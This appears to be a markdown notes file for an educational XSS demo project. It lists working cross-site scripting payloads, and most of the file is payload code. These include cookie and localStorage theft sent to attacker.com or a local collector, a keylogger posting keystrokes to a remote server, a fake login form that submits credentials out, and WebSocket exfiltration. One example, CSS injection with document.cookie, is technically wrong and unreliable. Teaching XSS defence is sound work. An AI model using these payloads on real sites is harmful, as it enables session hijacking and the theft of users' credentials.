Here are some **real-world XSS attack examples** that can be used for educational purposes in the project. These examples demonstrate how attackers exploit vulnerabilities to execute malicious scripts.

Tested: 
A) <img src="x" onerror="alert('XSS Attack!')">
b) document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
c) redirecting page:
    <a href="https://www.youtube.com/" target="_blank">Click here</a>
d) staling cookies:
    const img = document.createElement('img'); img.src = 'http://localhost:3000/steal?session=' + document.cookie; document.body.appendChild(img);
e) staling localStorage and sessionStorage:
    const data = {
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };
    fetch('http://localhost:3000/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });

### 1. **Stealing Cookies**
Attackers can use XSS to steal session cookies, which can then be used to impersonate a user.

    <img src="x" onerror="document.location='http://attacker.com/steal?cookie=' + document.cookie">

NOTE: change 'http://attacker.com/steal?cookie=' TO 'http://localhost:3000/steal?session=' after running server.js

**Explanation**:
- The `onerror` event triggers when the image fails to load.
- The script sends the user's cookies to the attacker's server.


### 2. **Keylogger**
An attacker can inject a script to log keystrokes and send them to a remote server.

    <script>
        document.addEventListener('keypress', function(e) {
            fetch('http://attacker.com/log', {
                method: 'POST',
                body: JSON.stringify({ key: e.key })
            });
        });
    </script>

**Explanation**:
- The script listens for keypress events.
- Each keypress is sent to the attacker's server.


### 3. **Fake Login Form**
An attacker can inject a fake login form to steal user credentials.

    <form action="http://attacker.com/steal-credentials" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password">
        <button type="submit">Login</button>
    </form>

**Explanation**:
- The form submits user credentials to the attacker's server.


### 4. **Redirect to Malicious Site**
Attackers can redirect users to a malicious website.

    <script>window.location = 'http://malicious-site.com';</script>

**Explanation**:
- The script redirects the user to a malicious website.


### 5. **Defacement**
An attacker can modify the content of the page to display offensive or misleading information.

    <script>
        document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
    </script>

**Explanation**:
- The script replaces the entire page content with a custom message.


### 6. **Session Hijacking via Hidden Iframe**
Attackers can use hidden iframes to steal session cookies or perform actions on behalf of the user.

    <iframe src="http://attacker.com/steal-session" style="display:none;"></iframe>

**Explanation**:
- The iframe is hidden using CSS.
- It loads a malicious page that can steal session cookies or perform unauthorized actions.


### 7. **DOM-Based XSS**
Attackers can manipulate the DOM to execute malicious scripts.

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const param = urlParams.get('input');
        document.body.innerHTML = param;
    </script>

**Explanation**:
- The script reads a parameter from the URL and injects it into the DOM without sanitization.
- This allows attackers to craft a URL with malicious scripts.


### 8. **Event Listener Injection**
Attackers can inject event listeners to execute malicious code.

    <div id="target" onmouseover="alert('XSS via Event Listener')">Hover over me</div>

**Explanation**:
- The `onmouseover` event triggers when the user hovers over the element.
- The injected script executes malicious code.


### 9. **CSS Injection**
Attackers can use CSS to execute malicious actions or exfiltrate data.

    <style>
        body { background: url('http://attacker.com/steal?data=' + document.cookie); }
    </style>

**Explanation**:
- The CSS rule sends cookies or other sensitive data to the attacker's server.


### 10. **WebSocket Hijacking**
Attackers can use WebSockets to exfiltrate data in real-time.

    <script>
        const ws = new WebSocket('ws://attacker.com');
        ws.onopen = () => ws.send(document.cookie);
    </script>

**Explanation**:
- The script opens a WebSocket connection to the attacker's server.
- It sends cookies or other sensitive data over the connection.


### Educational Note
These examples are for **educational purposes only**. They demonstrate the importance of input validation and sanitization to prevent XSS attacks. Always ensure that user input is properly sanitized and escaped before rendering it in the DOM.
